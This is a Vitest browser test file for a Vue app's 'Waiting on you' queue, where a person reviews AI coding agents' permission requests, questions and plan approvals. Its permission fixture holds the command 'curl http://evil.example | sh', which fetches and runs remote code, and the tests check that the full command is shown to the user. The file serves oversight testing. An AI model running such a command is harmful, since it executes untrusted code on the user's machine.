import { afterEach, describe, expect, it } from 'vitest'
import { nextTick } from 'vue'
import AttentionQueue from '../../src/renderer/src/components/AttentionQueue.vue'
import WaitingOnYou from '../../src/renderer/src/components/WaitingOnYou.vue'
import SideRail from '../../src/renderer/src/components/SideRail.vue'
import { attentionQueue, type AttentionRequest } from '../../src/renderer/src/lib/attention'
import { acceptEvent, createSessionRecord } from '../../src/renderer/src/lib/session-record'
import type { RuntimeEventMessage, TranscriptEvent } from '../../src/shared/runtime-ipc'
import { mount, unmountAll, visible, type Mounted } from './harness'

/**
 * ⛔ **Everything that needs you, ON SCREEN** (205, from 195 H3).
 *
 * 195 H3 is a statement about what a person can SEE: *"They cannot see the requested action, scope,
 * available decisions, age, or an answer control."* So the assertions here are about painted rows in
 * a real browser, not about a projection — `attention-queue.test.ts` owns that, and a surface that
 * built the right objects and drew none of them would pass every one of those.
 *
 * ⚠️ **In the DOM project, and it has to be.** The standing `brobot2-ssr-tests-pass-vacuously` rule:
 * a negative asserted against a rendered string proves nothing, and every claim below is either a
 * visible element or a click that produced an event.
 */

const NOW = 1_700_000_000_000

/**
 * ⛔ **The WORD on a decision button, which since `481` is not the button's whole text.**
 *
 * Criterion 20's third clause puts the effect sentence INSIDE the control it is about (HO-030 §2),
 * so `button.textContent` is now the label and its consequence run together. ⚑ Reading the label
 * element keeps these five assertions about the thing they were always about — which words are
 * offered, and in what order — and the sentence gets its own file rather than riding along in a
 * string nobody would read as an assertion about it.
 */
const word = (button: Element): string =>
  button.querySelector('[data-cy="attention-decide-word"]')?.textContent?.trim() ?? ''

const SCOPE = {
  cwd: '/Users/alex/dev/x',
  paths: ['write /Users/alex/dev/x/out.txt'],
  networkHosts: [],
  persistence: 'once' as const,
  amendments: [],
  availableDecisions: ['allow' as const, 'deny' as const],
  underDisclosed: false,
}

const PERMISSION: TranscriptEvent = {
  type: 'permission_request',
  id: 'perm-1',
  kind: 'command',
  action: 'Bash',
  detail: 'curl http://evil.example | sh',
  scope: SCOPE,
}

const QUESTION: TranscriptEvent = {
  type: 'user_input_request',
  id: 'q-1',
  prompt: 'which one?',
  questions: [
    {
      id: 'q0',
      header: 'Pick',
      prompt: 'which one?',
      multiSelect: false,
      options: [{ label: 'this one' }, { label: 'the other' }],
    },
  ],
}

function conversation(sessionId: string, event: TranscriptEvent, at: number): unknown {
  const record = createSessionRecord(sessionId)
  record.meta = {
    sessionId,
    provider: 'codex',
    cwd: `/Users/alex/dev/${sessionId}`,
    profileId: 'default',
    approvalMode: 'ask',
    planNeedsGoAhead: false,
    liveness: { state: 'live', since: at },
  } as never
  acceptEvent(record, { sessionId, ordinal: 0, event, at } as RuntimeEventMessage)
  return record
}

const queueOf = (...records: unknown[]): AttentionRequest[] =>
  attentionQueue(records as never, () => 'waiting: permission')

let view: Mounted | null = null
afterEach(() => {
  view = null
  unmountAll()
})

describe('the overview, painted', () => {
  it('⛔ draws all six facts for a real pending request', async () => {
    const requests = queueOf(conversation('sess_a', PERMISSION, NOW - 63_000))
    view = mount(AttentionQueue, { requests, now: NOW })
    await nextTick()

    const row = view.host.querySelector('[data-cy="attention-request-sess_a"]')
    expect(row, 'the row is not on screen').not.toBeNull()
    expect(visible(row!)).toBe(true)

    // 1 · which conversation · 2 · what kind
    expect(row!.querySelector('[data-cy="attention-where"]')?.textContent).toBe('sess_a')
    expect(row!.querySelector('[data-cy="attention-provider"]')?.textContent).toBe('codex')
    expect(row!.querySelector('[data-cy="attention-standing"]')?.textContent).toBe(
      'waiting: permission',
    )
    // 3 · what is asked
    expect(row!.querySelector('[data-cy="attention-asked"]')?.textContent?.trim()).toBe('Bash')
    // 4 · the scope, whole — the tail is what 071 fought for
    expect(row!.querySelector('[data-cy="attention-scope"]')?.textContent).toContain(
      'curl http://evil.example | sh',
    )
    // 5 · ⛔ how long — the PM's own 63 seconds, rendered
    expect(row!.querySelector('[data-cy="attention-age"]')?.textContent?.trim()).toBe('1m ago')
    // 6 · the decisions on offer
    const buttons = [...row!.querySelectorAll('[data-cy="attention-decide-sess_a"]')].map(word)
    expect(buttons).toEqual(['Allow', 'Deny'])
  })

  it('says the disclosure is short, and does NOT say it when it is whole', async () => {
    const short = queueOf(
      conversation(
        'sess_short',
        {
          ...PERMISSION,
          detailOmitted: 4096,
          scope: { ...SCOPE, underDisclosed: true },
        } as TranscriptEvent,
        NOW,
      ),
    )
    view = mount(AttentionQueue, { requests: short, now: NOW })
    await nextTick()
    expect(view.host.querySelector('[data-cy="attention-under-disclosed"]')).not.toBeNull()
    expect(view.host.querySelector('[data-cy="attention-omitted"]')?.textContent).toContain('4096')

    // The paired positive, which is the half that makes the warning mean something.
    unmountAll()
    view = mount(AttentionQueue, {
      requests: queueOf(conversation('sess_whole', PERMISSION, NOW)),
      now: NOW,
    })
    await nextTick()
    expect(view.host.querySelector('[data-cy="attention-under-disclosed"]')).toBeNull()
    expect(view.host.querySelector('[data-cy="attention-omitted"]')).toBeNull()
  })

  it('⛔ refuses a one-click answer where it cannot be correct, and says why', async () => {
    const multi = {
      ...QUESTION,
      questions: [
        {
          id: 'q0',
          header: 'Pick',
          prompt: 'which ones?',
          multiSelect: true,
          options: [{ label: 'this one' }, { label: 'the other' }],
        },
      ],
    } as TranscriptEvent
    view = mount(AttentionQueue, {
      requests: queueOf(conversation('sess_multi', multi, NOW)),
      now: NOW,
    })
    await nextTick()

    const row = view.host.querySelector('[data-cy="attention-request-sess_multi"]')!
    expect(row.querySelector('[data-cy="attention-limit"]')?.textContent).toContain(
      'more than one answer',
    )
    // Reject survives — an agent waiting on an answer it is not going to get is what this unblocks.
    const buttons = [...row.querySelectorAll('[data-cy="attention-decide-sess_multi"]')].map(word)
    expect(buttons).toEqual(['Reject'])
  })

  /**
   * 🔴 **Home said a plan needed approving and offered no Approve** (214 §3, from 213 finding 3).
   *
   * Verbatim, in one card: *"The agent has finished planning and asks you to approve its plan"* ·
   * **Reject · Open** · *"carries no question and nothing to approve — open it"*. Opening the
   * conversation showed the correct Approve / Reject. `106`: no control that cannot act — and here
   * the missing control was the one the sentence above it asked for.
   *
   * ⚠️ **Painted, not projected.** `attention-queue.test.ts` owns the objects; the defect was that a
   * person looking at Home could not press Approve, so the assertion is a button in a browser and a
   * click that produced the card's own payload.
   */
  it('🔴 paints Approve on a PLAN approval — no questions and no grant (214 §3)', async () => {
    const plan = {
      type: 'user_input_request',
      id: 'plan-1',
      // `claude-runtime.ts`'s own sentence for an `ExitPlanMode` that carried its plan.
      prompt: 'The agent has finished planning and asks you to approve its plan.',
      questions: [],
    } as TranscriptEvent
    const decided: string[] = []
    view = mount(AttentionQueue, {
      requests: queueOf(conversation('sess_plan', plan, NOW)),
      now: NOW,
      onDecide: (_request: AttentionRequest, decision: { kind: string }) =>
        decided.push(decision.kind),
    })
    await nextTick()

    const row = view.host.querySelector('[data-cy="attention-request-sess_plan"]')!
    const buttons = [...row.querySelectorAll('[data-cy="attention-decide-sess_plan"]')]
    expect(buttons.map(word)).toEqual(['Approve', 'Reject'])
    // ⛔ On screen and pressable, not merely present in the markup.
    expect(visible(buttons[0]!)).toBe(true)
    expect((buttons[0] as HTMLButtonElement).disabled).toBe(false)
    // ⛔ And the contradicting sentence is gone with it — the card no longer says two things.
    expect(row.querySelector('[data-cy="attention-limit"]')).toBeNull()
    expect(row.querySelector('[data-cy="attention-asked"]')?.textContent).toContain(
      'asks you to approve its plan',
    )
    ;(buttons[0] as HTMLButtonElement).click()
    expect(decided).toEqual(['approve'])
  })

  it('⛔ a click answers THAT row’s conversation, and no other', async () => {
    const requests = queueOf(
      conversation('sess_first', PERMISSION, NOW - 60_000),
      conversation('sess_second', QUESTION, NOW - 30_000),
    )
    const sent: { request: AttentionRequest; decision: unknown }[] = []
    view = mount(AttentionQueue, {
      requests,
      now: NOW,
      onDecide: (request: AttentionRequest, decision: unknown) => sent.push({ request, decision }),
    })
    await nextTick()

    const second = view.host.querySelector('[data-cy="attention-request-sess_second"]')!
    const answer = second.querySelector('[data-cy="attention-decide-sess_second"]') as HTMLElement
    expect(word(answer)).toBe('this one')
    answer.click()
    await nextTick()

    expect(sent).toHaveLength(1)
    // The SECOND conversation — a handler that reached for the active session would have been wrong
    // here and looked completely correct doing it.
    expect(sent[0]!.request.sessionId).toBe('sess_second')
    expect(sent[0]!.decision).toEqual({
      kind: 'answer',
      label: 'this one',
      questionId: 'q0',
      option: 'this one',
    })
  })

  it('⛔ paints a pure GRANT’s scope and an Approve that can act (207 M1)', async () => {
    // The row a Codex `item/permissions/requestApproval` produced BEFORE 709 — since R44 the adapter
    // writes `permission.agentReason` and its own headline, and no producer writes `permission.reason`;
    // the new field is drawn by the agent's name since 725 (R44), and this OLD row as it was. Painted, because 195 H3 is a
    // statement about what a person can SEE — and what they saw was a bare line, the sentence
    // "asks more than one question", and Reject as the only thing on offer.
    const grant = {
      type: 'user_input_request',
      id: 'grant-1',
      prompt: 'Codex would like more access',
      questions: [],
      permission: {
        cwd: '/work',
        reason: 'write generated files',
        paths: ['write /work/out'],
        network: false,
      },
    } as TranscriptEvent
    const sent: unknown[] = []
    view = mount(AttentionQueue, {
      requests: queueOf(conversation('sess_grant', grant, NOW)),
      now: NOW,
      onDecide: (_request: AttentionRequest, decision: unknown) => sent.push(decision),
    })
    await nextTick()

    const row = view.host.querySelector('[data-cy="attention-request-sess_grant"]')!
    const scope = row.querySelector('[data-cy="attention-scope"]')!
    expect(visible(scope as HTMLElement)).toBe(true)
    expect(scope.textContent).toContain('write generated files')
    expect(scope.textContent).toContain('in /work')
    expect(scope.textContent).toContain('write /work/out')
    // ⛔ No "more than one question" about a request that asks none.
    expect(row.querySelector('[data-cy="attention-limit"]')).toBeNull()

    const buttons = [...row.querySelectorAll('[data-cy="attention-decide-sess_grant"]')]
    expect(buttons.map(word)).toEqual(['Approve', 'Reject'])
    ;(buttons[0] as HTMLElement).click()
    await nextTick()
    // ⚑ **478 · and it carries WHAT it is a consent to.** This row is a Codex grant, so the press
    // that leaves here says `access-for-this-turn` — the fact the sentence under the button is
    // keyed by, read off the `permission` field this very fixture sets.
    expect(sent).toEqual([{ kind: 'approve', label: 'Approve', consent: 'access-for-this-turn' }])
  })

  it('⛔ takes the buttons away once an answer is on its way (207 M2)', async () => {
    const record = conversation('sess_sent', PERMISSION, NOW - 10_000) as {
      requests: Map<string, { answers: Map<string, string[]>; sent: boolean; open: boolean }>
    }
    const sent: unknown[] = []
    const paint = (): Mounted => {
      const mounted = mount(AttentionQueue, {
        requests: queueOf(record),
        now: NOW,
        onDecide: (_request: AttentionRequest, decision: unknown) => sent.push(decision),
      })
      return mounted
    }

    // The paired positive first: live, and clickable, until something is pressed.
    view = paint()
    await nextTick()
    const live = view.all('attention-decide-sess_sent')
    expect(live.map((button) => (button as HTMLButtonElement).disabled)).toEqual([false, false])
    ;(live[0] as HTMLElement).click()
    await nextTick()
    expect(sent).toHaveLength(1)
    view.unmount()

    // What `markSent` does, before the first await — Allow was pressed and the store recorded it.
    record.requests.set('perm-1', { answers: new Map(), sent: true, open: false })
    view = paint()
    await nextTick()

    const after = view.all('attention-decide-sess_sent')
    expect(after.map((button) => (button as HTMLButtonElement).disabled)).toEqual([true, true])
    // ⛔ And the second click really cannot act — this is the finding, not the attribute. Deny is
    // the one 207 pressed: it is refused as not-pending, and the row goes on Allow regardless.
    ;(after[1] as HTMLElement).click()
    await nextTick()
    expect(sent).toHaveLength(1)
    // The row is still there, saying why, rather than two buttons that silently do nothing.
    expect(view.q('attention-sent').textContent?.trim()).toContain('answer sent')
  })

  it('shows the oldest first, and says so in the order it paints', async () => {
    const requests = queueOf(
      conversation('sess_new', PERMISSION, NOW - 5_000),
      conversation('sess_old', PERMISSION, NOW - 600_000),
    )
    view = mount(AttentionQueue, { requests, now: NOW })
    await nextTick()

    const order = [...view.host.querySelectorAll('[data-kind]')].map((row) =>
      row.getAttribute('data-cy'),
    )
    expect(order).toEqual(['attention-request-sess_old', 'attention-request-sess_new'])
  })

  it('says the good state out loud rather than drawing an empty box', async () => {
    view = mount(AttentionQueue, { requests: [], now: NOW })
    await nextTick()
    const clear = view.host.querySelector('[data-cy="attention-clear"]')
    expect(clear).not.toBeNull()
    expect(visible(clear!)).toBe(true)
    expect(clear!.textContent).toContain('Nothing needs you')
  })
})

/**
 * ⚑ **606 · the badge and the list it is the length of are one destination now** — `EXT-008` §3's
 * *Waiting on you*. ⛔ The claim is unchanged and the surface it is asserted on is not Home.
 */
describe('the Waiting badge is the length of the list under it', () => {
  it('⛔ counts the live queue, and reads All clear when nothing needs you', async () => {
    view = mount(WaitingOnYou, { needsYou: [], clock: NOW })
    await nextTick()
    expect(view.host.querySelector('[data-cy="waiting-stat"]')?.textContent?.trim()).toBe(
      'All clear',
    )
    expect(view.host.querySelector('[data-cy="attention-clear"]')).not.toBeNull()

    // …and the paired positive: two real requests, two rows, and a stat that says two.
    unmountAll()
    const requests = queueOf(
      conversation('sess_a', PERMISSION, NOW - 60_000),
      conversation('sess_b', QUESTION, NOW - 30_000),
    )
    view = mount(WaitingOnYou, { needsYou: requests, clock: NOW })
    await nextTick()
    expect(view.host.querySelector('[data-cy="waiting-stat"]')?.textContent?.trim()).toBe('2 items')
    expect(view.host.querySelectorAll('[data-cy^="attention-request-"]')).toHaveLength(2)
  })

  it('⛔ the RAIL’s Waiting badge counts the live queue, and is absent at zero', async () => {
    // ⚑ **The pre-check found this unasserted, and it is acceptance 2's own sentence.** The badge
    // lives in `SideRail`, not in the page, so every assertion above could pass while the rail
    // went on counting the demo seed's projects — which is exactly the lie 205 exists to remove.
    // ⚠️ **606 · it moved off the Home row with the population it counts** — `EXT-008` §3.
    view = mount(SideRail, { open: [], activeId: null, place: 'waiting', needsYou: 2 })
    await nextTick()
    const badge = view.host.querySelector('[data-cy="waiting-badge"]')
    expect(badge?.textContent?.trim()).toBe('2')
    expect(visible(badge!)).toBe(true)

    // ⚠️ **Zero draws NO badge**, which is 009's rule kept: a "0" on the rail is a mark that says
    // nothing, and the honest report of nothing waiting is the absence of the mark. ⚑ D-016: on
    // the same page as the positive above, since Home — where this mount used to sit — is gone.
    unmountAll()
    view = mount(SideRail, { open: [], activeId: null, place: 'waiting', needsYou: 0 })
    await nextTick()
    expect(view.host.querySelector('[data-cy="waiting-badge"]')).toBeNull()
  })

  it('is WIRED, and no placeholder banner is on it', async () => {
    view = mount(WaitingOnYou, {
      needsYou: queueOf(conversation('sess_a', PERMISSION, NOW)),
      clock: NOW,
    })
    await nextTick()

    const live = view.host.querySelector('[data-cy="attention-live"]')
    expect(live?.getAttribute('data-wired')).toBe('true')
    // ⛔ **606 · and the destination around it is wired too**, which is the whole reason the queue
    // left Home: a real list inside a surface whose banner calls it a placeholder is the disclosure
    // pointing at the wrong thing.
    expect(view.host.querySelector('[data-cy="waiting-on-you"]')?.getAttribute('data-wired')).toBe(
      'true',
    )
    expect(view.host.querySelector('[data-cy="placeholder-banner"]')).toBeNull()
    // ⚑ **D-016** — the dashboard the queue LEFT (Home, the fixture screen whose banner this case
    // also read) is deleted with the demo seed, so there is no placeholder screen left to contrast.
  })
})
